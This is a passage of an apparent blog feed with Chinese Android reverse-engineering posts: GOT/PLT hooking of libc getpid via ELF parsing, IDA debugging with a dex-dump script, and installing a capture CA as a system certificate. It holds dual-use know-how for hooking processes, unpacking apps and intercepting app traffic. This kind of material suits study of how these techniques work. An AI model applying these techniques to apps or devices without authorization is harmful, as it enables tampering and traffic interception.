<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-got-hook-output.png"></p>
<p>成功实现对<code>getpid</code>函数的<code>GOT Hook</code>。</p>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-got-hook-log.png"></p>
<h3 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h3><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm64-got-hook-log.png"></p>
<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><ol>
<li>未绕过<code>dlopen</code>命名空间限制，在<code>Android 7</code>以上无法打开非公共库</li>
<li>未hook<code>dlopen</code>，无法实时修改加载模块的GOT表</li>
<li>解析maps获取模块基址，兼容性可能存在一定问题</li>
<li>基于链接视图静态解析ELF，无法处理加壳的so</li>
<li>静态注入可执行文件，无法绕过完整性检测</li>
<li>未提供卸载函数，无法恢复GOT表</li>
<li>模块路径硬编码，通用性不足</li>
<li>未处理全局函数指针调用</li>
<li>…</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本项目，学习了<code>GOT Hook</code>原理和ELF文件结构，并适配了<code>ARM64</code>架构，目的基本达到。虽然功能还不够完善，但<del>短期内应该不会再改动了</del>（俗话说得好：不要重复造轮子）。</p>
<p>实际应用可以考虑使用字节的<a href="https://github.com/bytedance/bhook">bhook</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/byhook/article/details/103500524">android中基于plt/got的hook实现原理</a><br><a href="%5Bhttps://linyt.blog.csdn.net/article/details/51636753%5D">聊聊Linux动态链接中的PLT和GOT(2)——延迟重定位</a><br><a href="https://zhuanlan.zhihu.com/p/108274829">constructor属性函数在动态库加载中的执行顺序</a><br><a href="https://www.52pojie.cn/thread-948942-1-1.html">Android7.0以上命名空间详解(dlopen限制)</a><br><a href="https://blog.csdn.net/u011247544/article/details/78564564">Android中GOT表HOOK手动实现</a><br><a href="https://www.cnblogs.com/mmmmar/p/8228391.html">Android GOT Hook</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>简易Android ARM&amp;ARM64 GOT Hook (二)</title>
    <url>/2021/08/30/android-arm-plt-hook/</url>
    <content><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><a href="http://blog.xhyeax.com/2022/06/08/android-arm64-got-hook-rel-plta/">ARM64 GOT Hook中对.rel.plta的处理</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前文<a href="https://blog.xhyeax.com/2021/08/23/android-arm-got-hook/">简易Android ARM&amp;ARM64 GOT Hook (一)</a>，基于链接视图，解析section查找GOT表偏移值，无法应对section被处理过的情况（如加固）。</p>
<p>本文基于ELF的执行视图(<code>Execution View</code>)，讨论<code>Android</code> <code>ARM&amp;ARM64</code>架构的<code>GOT/PLT Hook</code>（仍以Hook公共库<code>libc.so</code>的<code>getpid</code>函数为例）。</p>
<span id="more"></span>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li>通过maps文件获取模块基址，解析内存中的ELF。</li>
<li>查找并解析<code>.dynamic</code>段，得到<code>.rel.plt</code>、<code>.rel.dyn</code>、<code>.dynsym</code>、<code>.dynstr</code>和<code>.hash</code>表。</li>
<li>通过<code>.hash -&gt; .dynsym -&gt; .dynstr</code>查找导入符号，再遍历<code>.rel.plt</code>和<code>.rel.dyn</code>，得到函数偏移。</li>
<li>基址加上偏移得到内存地址，修改函数地址即可。</li>
</ol>
<p>注入方式及编译环境同<a href="https://blog.xhyeax.com/2021/08/23/android-arm-got-hook/">前文</a>，不再赘述。</p>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基于执行视图解析ELF</span></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">hackBySegment</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *module_name, <span class="keyword">const</span> <span class="keyword">char</span> *target_lib, <span class="keyword">const</span> <span class="keyword">char</span> *target_func,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">uintptr_t</span> replace)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;hackBySegment start.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取目标函数地址</span></span><br><span class="line">    <span class="keyword">void</span> *handle = <span class="built_in">dlopen</span>(target_lib, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">auto</span> ori = (<span class="keyword">uintptr_t</span>) <span class="built_in">dlsym</span>(handle, target_func);</span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;ori addr: %&quot;</span> SCNxPTR <span class="string">&quot;\n&quot;</span>, ori);</span><br><span class="line">    <span class="comment">// 获取符号地址 (解析Segment)</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> replaceAddr = <span class="built_in">getSymAddrDynamic</span>(module_name, target_func);</span><br><span class="line">    <span class="comment">// 替换地址</span></span><br><span class="line">    <span class="built_in">replaceFunction</span>(replaceAddr, replace, ori);</span><br><span class="line">    <span class="keyword">return</span> ori;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码见<a href="https://github.com/XhyEax/AndroidGotHook">AndroidGotHook</a></p>
<h3 id="获取-dynamic段"><a href="#获取-dynamic段" class="headerlink" title="获取.dynamic段"></a>获取.dynamic段</h3><p>解析maps文件获取到模块地址后，基于执行视图解析ELF。</p>
<p>从<code>elf header</code>中得到<code>program header table</code>的起始偏移（<code>e_phoff</code>）、<code>program header</code>大小(<code>e_phentsize</code>)和总<code>program header</code>个数（<code>e_phnum</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-elf-header.png"></p>
<p>遍历<code>program header table</code>，查找<code>p_type</code>为<code>PT_DYNAMIC</code>的<code>program header</code>，得到<code>.dynamic</code>段在内存中的偏移值（<code>p_vaddr</code>）和大小（<code>p_memsz</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-ph-dynamic.png"></p>
<p>将模块基址与<code>.dynamic</code>偏移值相加，得到<code>.dynamic</code>段的起始地址。</p>
<h3 id="解析-dynamic段"><a href="#解析-dynamic段" class="headerlink" title="解析.dynamic段"></a>解析.dynamic段</h3><p>遍历<code>.dynamic</code>段，根据<code>d_tag</code>解析不同的表。<br><code>.rel.plt</code>：<code>DT_JMPREL</code>（大小储存在<code>DT_PLTRELSZ</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-relplt.png"><br><code>.rel.dyn</code>：<code>DT_REL</code>（大小储存在<code>DT_RELSZ</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-reldyn.png"><br><code>.dynsym</code>：<code>DT_SYMTAB</code><br><code>.dynstr</code>：<code>DT_STRTAB</code><br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-dynsym-str.png"><br><code>.hash</code>：<code>DT_HASH</code><br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-hash.png"></p>
<p>注：解析<code>.dynamic</code>的ELF模板来自<a href="https://www.52pojie.cn/thread-948942-1-1.html">Android7.0以上命名空间详解(dlopen限制)附上010editor模块</a></p>
<h3 id="查找符号"><a href="#查找符号" class="headerlink" title="查找符号"></a>查找符号</h3><p>通过<code>.hash -&gt; .dynsym -&gt; .dynstr</code>查找符号。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ELFW</span>(Sym) *target = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> hash = <span class="built_in">elf_sysv_hash</span>((<span class="keyword">const</span> <span class="keyword">uint8_t</span> *) symName);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = buckets[hash % buckets_cnt];</span><br><span class="line">        <span class="number">0</span> != i; i = chains[i]) &#123;</span><br><span class="line">    <span class="built_in">ELFW</span>(Sym) *sym = dynsym + i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> type = <span class="built_in">ELF_ST_TYPE</span>(sym-&gt;st_info);</span><br><span class="line">    <span class="keyword">if</span> (STT_FUNC != type &amp;&amp; STT_GNU_IFUNC != type &amp;&amp; STT_NOTYPE != type)</span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">// find function only, allow no-type</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strcmp</span>(dynstr + sym-&gt;st_name, symName)) &#123;</span><br><span class="line">        target = sym;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体操作为：</p>
<ol>
<li><p>计算符号名称的哈希值，然后从<code>.hash</code>获取符号在<code>.dynsym</code>中的索引。</p>
<blockquote>
<p>接受符号名称的散列函数会返回一个值，用于计算 bucket 索引。因此，如果散列函数为某个名称返回值 x，则 bucket [x% nbucket] 将会计算出索引 y。此索引为符号表和链表的索引。如果符号表项不是需要的名称，则 chain[y] 将使用相同的散列值计算出符号表的下一项。</p>
</blockquote>
</li>
<li><p>通过索引从<code>.dynsym</code>获取符号，根据符号类型和符号名（通过<code>st_name</code>从<code>.dynstr</code>获取字符串），判断与目标函数是否匹配。</p>
</li>
</ol>
<p>PS：也可直接遍历<code>.dynsym</code>并比对字符串，时间复杂度更高</p>
<blockquote>
<p>.hash -&gt; .dynsym -&gt; .dynstr，时间复杂度：O(x) + O(1) + O(1)<br>.dynsym -&gt; .dynstr，时间复杂度：O(n) + O(1)</p>
</blockquote>
<h3 id="计算内存地址"><a href="#计算内存地址" class="headerlink" title="计算内存地址"></a>计算内存地址</h3><p>遍历<code>.rel.plt</code>和<code>.rel.dyn</code>，比对符号和重定位类型，获取函数偏移值（<code>r_offset</code>）。与模块基址相加得到内存地址。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rel_plt_cnt; i++) &#123;</span><br><span class="line">        <span class="built_in">ELFW</span>(Rel) &amp;rel = rel_plt[i];</span><br><span class="line">        <span class="keyword">if</span> (&amp;(dynsym[<span class="built_in">ELF_R_SYM</span>(rel.r_info)]) == target &amp;&amp;</span><br><span class="line">            <span class="built_in">ELF_R_TYPE</span>(rel.r_info) == ELF_R_JUMP_SLOT) &#123;</span><br><span class="line"><span class="comment">//            LOGI(&quot;target r_offset: %lX&quot;, rel.r_offset);</span></span><br><span class="line">            <span class="keyword">return</span> moduleBase + rel.r_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rel_dyn_cnt; i++) &#123;</span><br><span class="line">        <span class="built_in">ELFW</span>(Rel) &amp;rel = rel_dyn[i];</span><br><span class="line">        <span class="keyword">if</span> (&amp;(dynsym[<span class="built_in">ELF_R_SYM</span>(rel.r_info)]) == target &amp;&amp;</span><br><span class="line">            (<span class="built_in">ELF_R_TYPE</span>(rel.r_info) == ELF_R_ABS</span><br><span class="line">             || <span class="built_in">ELF_R_TYPE</span>(rel.r_info) == ELF_R_GLOB_DAT)) &#123;</span><br><span class="line"><span class="comment">//            LOGI(&quot;target r_offset: %lX&quot;, rel.r_offset);</span></span><br><span class="line">            <span class="keyword">return</span> moduleBase + rel.r_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后替换该内存地址对应的函数即可，同<a href="https://blog.xhyeax.com/2021/08/23/android-arm-got-hook/">前文</a>。</p>
<h3 id="适配ARM64"><a href="#适配ARM64" class="headerlink" title="适配ARM64"></a>适配ARM64</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFW(what) Elf64_ ## what</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_TYPE(what) ELF64_R_TYPE(what)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_SYM(what) ELF64_R_SYM(what)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFW(what) Elf32_ ## what</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_TYPE(what) ELF32_R_TYPE(what)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_SYM(what) ELF32_R_SYM(what)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__arm__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_JUMP_SLOT R_ARM_JUMP_SLOT     <span class="comment">//.rel.plt</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_GLOB_DAT  R_ARM_GLOB_DAT      <span class="comment">//.rel.dyn</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_ABS       R_ARM_ABS32         <span class="comment">//.rel.dyn</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__aarch64__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_JUMP_SLOT R_AARCH64_JUMP_SLOT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_GLOB_DAT  R_AARCH64_GLOB_DAT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_R_ABS       R_AARCH64_ABS64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>注意：除了宏定义不同，<code>ARM64</code>下使用的是带有<code>addend</code>的<code>.rela</code>表，需要做进一步适配。适配过程见<a href="http://blog.xhyeax.com/2022/06/08/android-arm64-got-hook-rel-plta/">ARM64 GOT Hook中对.rel.plta的处理</a>。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>同<a href="https://blog.xhyeax.com/2021/08/23/android-arm-got-hook/">前文</a>，替换动态库即可测试。</p>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-plt-hook-log.png"></p>
<h3 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h3><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm64-plt-hook-log.png"></p>
<h2 id="作为动态链接库"><a href="#作为动态链接库" class="headerlink" title="作为动态链接库"></a>作为动态链接库</h2><p>详见<a href="https://github.com/XhyEax/AndroidGOTHook">项目</a>的<code>vitcim_app</code>模块。</p>
<p>通过配置<code>CMakeLists.txt</code>将<code>libinject.so</code>作为动态库链接，在<code>JNI_OnLoad</code>调用<code>hackBySegment</code>替换<code>getpid</code>函数。</p>
<p>日志如下：<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm64-so-plt-hook-log.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要学习了<code>.dynamic</code>段的解析和导入符号的查找方式。虽然实现了基于执行视图解析ELF，但仍存在许多不足。不过这次是真的短期内不会再改动了。（<strong>不要重复造轮子</strong>）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/L173864930/article/details/40507359">基于Android的ELF PLT/GOT符号和重定向过程ELF Hook实现</a><br><a href="https://bbs.pediy.com/thread-267842.htm">ELF文件格式与got表hook简单实现</a><br><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-54839.html">重定位节 - 链接程序和库指南</a><br><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-79797.html">符号表节 - 链接程序和库指南</a><br><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-48031.html">散列表节 - 链接程序和库指南</a><br><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-42444.html">动态节 - 链接程序和库指南</a><br><a href="https://bbs.pediy.com/thread-255670.htm">ELF文件结构详解</a><br><a href="https://zhuanlan.zhihu.com/p/269441842">PLT HOOK</a><br><a href="https://github.com/bytedance/bhook">bhook</a><br><a href="https://github.com/iqiyi/xhook">xhook</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM64 GOT Hook中对.rela.plt的处理</title>
    <url>/2022/06/08/android-arm64-got-hook-rela-plt/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在<a href="https://github.com/XhyEax/AndroidGotHook">AndroidGotHook</a>项目中，对于<code>ARM64</code>架构，在重定位表中找不到目标符号，无法基于<code>Segment</code>进行<code>GOT Hook</code>。</p>
<p>通过打印日志，与<code>readelf -r</code>的结果比对，最终发现，代码错误地解析了重定位表（将<code>.rela.plt</code>处理为了<code>.rel.plt</code>），导致偏移值查找失败。</p>
<p>查看git历史记录可知，<code>Android</code>的<code>linker</code>从<code>5.0</code>（API等级21）开始支持<code>DT_RELA</code>。使用宏<code>USE_RELA</code>控制。</p>
<p><a href="https://android.googlesource.com/platform/bionic/+/refs/heads/master/linker/linker_common_types.h#38">linker_common_types.h#38</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Android uses RELA for LP64.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USE_RELA 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>解决方案：<code>ARM64</code>架构下使用<code>elf64_rela</code>数据结构。</p>
<p>PS：也可以通过<code>DT_PLTREL</code>来判断使用的是哪种重定位表。</p>
<h2 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_rel</span> &#123;</span></span><br><span class="line">  Elf64_Addr r_offset;</span><br><span class="line">  Elf64_Xword r_info;</span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_rela</span> &#123;</span></span><br><span class="line">  Elf64_Addr r_offset;</span><br><span class="line">  Elf64_Xword r_info;</span><br><span class="line">  Elf64_Sxword r_addend;</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>抄<a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker.cpp">linker.cpp</a>代码即可。</p>
<p>增加对<code>DT_RELA</code>和<code>DT_RELASZ</code>的处理，并使用宏定义进行条件判断，例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></span><br><span class="line">                rela_plt = (<span class="built_in">ELFW</span>(Rela) *) (moduleBase + dyn.d_un.d_ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">                rel_plt = (<span class="built_in">ELFW</span>(Rel) *) (moduleBase + dyn.d_un.d_ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>完整代码见<a href="https://github.com/XhyEax/AndroidGotHook">AndroidGotHook</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA调试安卓so 在libart.so OpenMemory下断点</title>
    <url>/2019/09/14/android-debug-onload/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>如果想要在so加载时就下断点的话，需要以调试模式运行，并使用ddms进行jdb的连接。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>一部打开了调试开关（ro.debuggable=1）的手机或可调试的apk, IDA及android_server, 已启动的ddms（启动<code>AndroidSDK\tools\monitor.bat</code>）</p>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="1-开启端口转发并启动android-server"><a href="#1-开启端口转发并启动android-server" class="headerlink" title="1. 开启端口转发并启动android_server"></a>1. 开启端口转发并启动android_server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:12345 tcp:12345</span><br><span class="line">adb shell su -c <span class="string">&quot;/data/as&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里使用的是修改过的android_server，默认端口为12345</p>
<h3 id="2-以调试模式启动app"><a href="#2-以调试模式启动app" class="headerlink" title="2. 以调试模式启动app"></a>2. 以调试模式启动app</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n xyz.sysorem.cokey/.CokeyActivity</span><br></pre></td></tr></table></figure>
<p>这时手机会显示<code>Waiting For Debugger</code></p>
<h3 id="3-使用IDA附加及下断点"><a href="#3-使用IDA附加及下断点" class="headerlink" title="3. 使用IDA附加及下断点"></a>3. 使用IDA附加及下断点</h3><p>点击确定前先修改<code>Debug options</code>，把Event下前三个Suspend都勾选上，然后连接。<br>选定要调试的app进程后，在模块列表中找到<code>libart.so</code>，并在目标函数位置下断点<br>然后点击运行</p>
<h3 id="4-使用jdb附加，使程序继续运行"><a href="#4-使用jdb附加，使程序继续运行" class="headerlink" title="4. 使用jdb附加，使程序继续运行"></a>4. 使用jdb附加，使程序继续运行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</span><br></pre></td></tr></table></figure>
<p>此处的8700即ddms中显示的对应端口<br>正常情况下就会在libc.so处暂停了</p>
<h3 id="5-dump"><a href="#5-dump" class="headerlink" title="5. dump"></a>5. dump</h3><p>在OpenMemory断下时，按shift+F2，运行dump脚本</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, dex_addr, end_addr;</span><br><span class="line">    fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:\\dump.dex&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    end_addr = r0 + r1;</span><br><span class="line">    <span class="keyword">for</span> ( dex_addr = r0; dex_addr &lt; end_addr; dex_addr ++ )</span><br><span class="line">        <span class="built_in">fputc</span>(<span class="built_in">Byte</span>(dex_addr), fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/341924686e51">安卓 smali启动就附加调试 的正确步骤</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓8.0以上创建悬浮窗</title>
    <url>/2019/03/15/android-floatview/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>代码在8.0以下系统可正常创建悬浮窗，8.0以上则创建不了。原因是悬浮窗样式需要重新设置。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>增加SDK判断代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">    wmParams.type = LayoutParams.TYPE_APPLICATION_OVERLAY;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    wmParams.type = LayoutParams.TYPE_PHONE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="判断是否拥有悬浮窗权限并申请"><a href="#判断是否拥有悬浮窗权限并申请" class="headerlink" title="判断是否拥有悬浮窗权限并申请"></a>判断是否拥有悬浮窗权限并申请</h2><p>安卓6.0（代号M，SDK 23）之后，需要动态申请权限，悬浮窗权限也不例外。所以可以在添加以下代码来申请悬浮窗权限。<br>PS：当然，必须在<code>AndroidManifest.xml</code>中添加<br><code>&lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot; /&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">23</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!Settings.canDrawOverlays(activity))</span><br><span class="line">                &#123;</span><br><span class="line">                    Intent it = <span class="keyword">new</span> Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);</span><br><span class="line">                    activity.startActivityForResult(it, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TargetApi(23)</span> <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> reqCode, <span class="keyword">int</span> resCode, Intent data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!Settings.canDrawOverlays(<span class="keyword">this</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;未授予悬浮窗权限！&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;悬浮窗权限授予成功！&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓7.0及以上 导入为系统证书</title>
    <url>/2019/10/03/android-import-as-system-cert/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>从安卓7.0开始，Android更改了对用户安装证书的默认信任行为。应用程序默认只信任系统级别的CA证书。<br>所以需要hook第三方包的证书校验函数（如JustTrustMe）或者直接导入为系统证书以供抓包</p>
<h2 id="导入方法"><a href="#导入方法" class="headerlink" title="导入方法"></a>导入方法</h2><h3 id="1-导出-der证书文件"><a href="#1-导出-der证书文件" class="headerlink" title="1. 导出.der证书文件"></a>1. 导出.der证书文件</h3><p>从抓包应用中导出即可。</p>
<h3 id="2-转换为pem格式并重命名"><a href="#2-转换为pem格式并重命名" class="headerlink" title="2. 转换为pem格式并重命名"></a>2. 转换为pem格式并重命名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">　　openssl x509 -inform DER -<span class="keyword">in</span> cacert.der -out cacert.pem</span><br><span class="line">　　openssl x509 -inform PEM -subject_hash_old -<span class="keyword">in</span> cacert.pem |head -1</span><br><span class="line">　　mv cacert.pem &lt;<span class="built_in">hash</span>&gt;.0</span><br></pre></td></tr></table></figure>
<p><code>&lt;hash&gt;</code>替换成输出的值</p>
<h3 id="3-导入至-system-etc-security-cacerts"><a href="#3-导入至-system-etc-security-cacerts" class="headerlink" title="3. 导入至/system/etc/security/cacerts"></a>3. 导入至<code>/system/etc/security/cacerts</code></h3><p>挂载system为可读写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o remount,rw /system</span><br></pre></td></tr></table></figure>
<p>复制到<code>/system/etc/security/cacerts</code>下，并设置权限为644，然后重启<br>（也可打包成magisk模块刷入）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Entr0py/p/9675061.html">安卓7.0及以上用户证书导入的问题</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Kernel Panic日志保存位置</title>
    <url>/2022/06/14/android-kernel-panic-log/</url>
    <content><![CDATA[<h2 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h2><p><code>/proc/last_kmsg</code></p>
<p><code>/sys/fs/pstore/console-ramoops</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://stackoverflow.com/questions/9682306/android-how-to-get-kernel-logs-after-kernel-panic">Android: How to get kernel logs after kernel panic?</a></p>
]]></content>
      <tags>
